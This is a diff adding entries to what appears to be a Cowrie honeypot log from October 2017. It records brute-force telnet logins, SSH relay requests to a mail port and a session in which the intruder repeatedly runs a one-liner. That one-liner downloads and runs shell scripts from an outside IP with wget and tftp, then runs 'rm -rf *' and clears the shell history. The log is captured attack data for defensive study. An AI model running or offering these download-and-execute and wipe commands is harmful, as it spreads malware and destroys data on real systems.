@@ -3585,3 +3585,623 @@
 2017-10-13T15:44:28+0000 [CowrieTelnetTransport,4249,27.198.172.105] Warning: state changed and new state returned
 2017-10-13T15:44:36+0000 [CowrieTelnetTransport,4249,27.198.172.105] Connection lost after 38 seconds
 2017-10-13T15:44:40+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 27.198.172.105:58650 (10.3.66.85:2223) [session: TT4250]
+2017-10-13T15:45:15+0000 [CowrieTelnetTransport,4250,27.198.172.105] login attempt [admin/password] failed
+2017-10-13T15:45:15+0000 [CowrieTelnetTransport,4250,27.198.172.105] Warning: state changed and new state returned
+2017-10-13T15:45:18+0000 [CowrieTelnetTransport,4250,27.198.172.105] Connection lost after 38 seconds
+2017-10-13T15:45:27+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 27.198.172.105:1146 (10.3.66.85:2223) [session: TT4251]
+2017-10-13T15:45:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] got channel 'direct-tcpip' request
+2017-10-13T15:45:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] direct-tcp connection request to 98.138.112.37:25 from ::1:11934
+2017-10-13T15:45:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] got channel 'direct-tcpip' request
+2017-10-13T15:45:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,4173,5.188.87.56] direct-tcp connection request to 98.138.112.37:25 from ::1:48954
+2017-10-13T15:45:58+0000 [CowrieTelnetTransport,4251,27.198.172.105] login attempt [666666/666666] failed
+2017-10-13T15:45:58+0000 [CowrieTelnetTransport,4251,27.198.172.105] Warning: state changed and new state returned
+2017-10-13T15:46:06+0000 [CowrieTelnetTransport,4251,27.198.172.105] Connection lost after 38 seconds
+2017-10-13T15:46:14+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 27.198.172.105:3329 (10.3.66.85:2223) [session: TT4252]
+2017-10-13T15:46:45+0000 [CowrieTelnetTransport,4252,27.198.172.105] login attempt [root/anko] succeeded
+2017-10-13T15:46:47+0000 [CowrieTelnetTransport,4252,27.198.172.105] Opening TTY Log: log/tty/20171013-154647-None-4252i.log
+2017-10-13T15:46:47+0000 [CowrieTelnetTransport,4252,27.198.172.105] Warning: state changed and new state returned
+2017-10-13T15:46:55+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:46:55+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: sh 
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:46:56+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:46:56+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://191.96.112.107/kittyhaxz.sh>
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: chmod 777 /kittyhaxz.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: sh /kittyhaxz.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: chmod 777 ktftp1.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: sh ktftp1.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: chmod 777 ktftp2.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: sh ktftp2.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: rm -rf /kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-10-13T15:46:56+0000 [HTTPPageDownloader,client] Command found: history -c
+2017-10-13T15:46:56+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://191.96.112.107/kittyhaxz.sh>
+2017-10-13T15:47:04+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:04+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:04+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:04+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:05+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:12+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:15+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:24+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:31+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:32+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:32+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:34+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:34+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:35+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:43+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:44+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:50+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:50+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /tmp
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /var/run
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /mnt
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /root
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: cd /
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: wget http://191.96.112.107/kittyhaxz.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 kittyhaxz.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh kittyhaxz.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp 191.96.112.107 -c get ktftp1.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp1.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp1.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: ktftp -r ktftp2.sh -g 191.96.112.107
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: chmod 777 ktftp2.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh ktftp2.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: rm -rf *
+2017-10-13T15:47:51+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command found: history -c
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: sh
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] CMD: shell
+2017-10-13T15:47:54+0000 [CowrieTelnetTransport,4252,27.198.172.105] Command not found: shell
